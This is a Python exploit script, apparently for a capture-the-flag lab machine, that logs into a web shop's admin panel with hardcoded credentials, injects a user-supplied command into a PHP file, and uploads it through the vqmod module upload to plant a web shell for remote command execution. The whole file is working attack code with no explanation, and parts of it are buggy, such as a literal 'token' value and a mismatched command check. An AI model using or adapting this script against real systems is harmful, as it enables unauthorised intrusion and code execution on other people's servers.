#!/usr/bin/env python3
from bs4 import BeautifulSoup
import requests
import sys


session = requests.Session()
url = "http://10.10.10.207"
username = "admin"
password = "theNextGenSt0r3!~"
filename = "bypass.php"


def login(url, user, password):
    point_url = url + "/shop/admin/login.php"
    req_get_token = session.get(point_url)
    soup = BeautifulSoup(req_get_token.text, "html.parser")
    token = soup.input['value']
    data = {"token": "token", "redirect_url": url+"/admin/", "username": user, "password": password, "login": "true"}
    req = session.post(point_url, data=data)
    if "You are now logged in as admin" in req.text:
        print("[+] Login Success...")
    else:
        print("[-] Failed, exiting... ")
        sys.exit(1)


def put_command(filename):
    file = open(filename, "r")
    in_line = file.readlines()
    file = open(filename, "w")
    command = input("Enter comamnd: ")
    in_line[16] = f"pwn({command});\n"
    file.writelines(in_line)
    if f"pwn('{command}');" in in_line[16]:
        print("[+] command put Success")
    else:
        print("[-] Failed, exiting... ")
        sys.exit(1)



def upload_shell(url, filename):
    point_url = url+"/shop/admin/?app=vqmods&doc=vqmods"
    handle = open(filename,"r")
    file_content = handle.read()
    req_get_token = session.get(point_url)
    soup = BeautifulSoup(req_get_token.text, 'html.parser')
    get_token = soup.find_all('input')[2]
    search_token = str(get_token).find('value="')+7
    token = str(get_token)[search_token:81]
    files = { 'vqmod': (filename, file_content , "application/xml")} 
    data = {'token': token, 'upload': 'Upload'}
    req = session.post(point_url, files=files, data=data)
    check_shell = session.get(url+"/shop/vqmod/xml/"+filename)
    if check_shell.status_code == 200:
        print("[+] Shell Uploaded in "+url+"/shop/vqmod/xml/"+filename)
    else:
        print("[-] Failed, exiting...")
        sys.exit(1)
    


login(url, username, password)
put_command(filename)
upload_shell(url, filename)